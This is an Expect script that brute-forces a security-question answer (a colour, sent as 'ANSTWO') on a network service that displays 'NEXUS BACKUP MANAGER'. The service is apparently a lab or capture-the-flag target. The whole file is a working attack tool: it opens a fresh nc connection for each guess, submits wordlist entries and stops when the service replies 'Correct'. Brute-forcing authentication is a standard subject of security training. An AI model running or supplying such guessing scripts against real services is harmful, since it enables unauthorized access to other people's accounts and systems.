#!/usr/bin/expect -f
# colors.sh — brute force ANSTWO (color) answers from a wordlist
# Service drops the connection on each Incorrect answer, so we reconnect
# per attempt.
#
# Usage:
#   ./colors.sh <ip> <port> <wordlist>

set timeout 5

# ── arg parsing ───────────────────────────────────────────────
if {[llength $argv] < 3} {
    puts "Usage: $argv0 <ip_address> <port> <wordlist>"
    exit 1
}
set ip       [lindex $argv 0]
set port     [lindex $argv 1]
set wordlist [lindex $argv 2]

# ── open wordlist ─────────────────────────────────────────────
if {[catch {open $wordlist r} fh]} {
    puts "ERROR: cannot open wordlist '$wordlist': $fh"
    exit 1
}

puts "\[*\] Target:   $ip:$port"
puts "\[*\] Wordlist: $wordlist"
puts "\[*\] Mode:     ANSTWO (color) — reconnect per attempt"
puts "\[*\] Starting..."
puts ""

set attempt 0

# ── loop: fresh connection each guess ─────────────────────────
while {[gets $fh ans] != -1} {
    set ans [string trim $ans]
    if {$ans eq "" || [string index $ans 0] eq "#"} { continue }

    incr attempt
    puts -nonewline "\[$attempt\] $ans ... "
    flush stdout

    # fresh connection — suppress nc chatter per-attempt
    log_user 0
    spawn -noecho nc -nvv $ip $port

    # wait for menu
    expect {
        -re "NEXUS BACKUP MANAGER|ANSTWO|Please Enter Answer" {}
        timeout {
            puts "TIMEOUT waiting for menu"
            catch {close}
            wait
            continue
        }
        eof {
            puts "EOF before menu"
            wait
            continue
        }
    }

    send "ANSTWO\r"

    # wait for answer prompt
    expect {
        -re "Please Enter Answer|ANSTWO <answer>|ANS\\?TWO" {}
        timeout {
            puts "no answer prompt"
            catch {close}
            wait
            continue
        }
        eof {
            puts "EOF at answer prompt"
            wait
            continue
        }
    }

    send "$ans\r"

    # check response
    expect {
        -re "Correct" {
            log_user 1
            puts "CORRECT"
            puts ""
            puts "════════════════════════════════════════════════"
            puts "  ✓ ANSTWO color = $ans"
            puts "════════════════════════════════════════════════"
            catch {close}
            wait
            close $fh
            exit 0
        }
        -re "Incorrect|Wrong" {
            puts "incorrect"
        }
        eof {
            puts "EOF"
        }
        timeout {
            puts "timeout"
        }
    }

    catch {close}
    wait
}

puts ""
puts "\[!\] Wordlist exhausted ($attempt attempts), no correct answer."
close $fh
exit 1
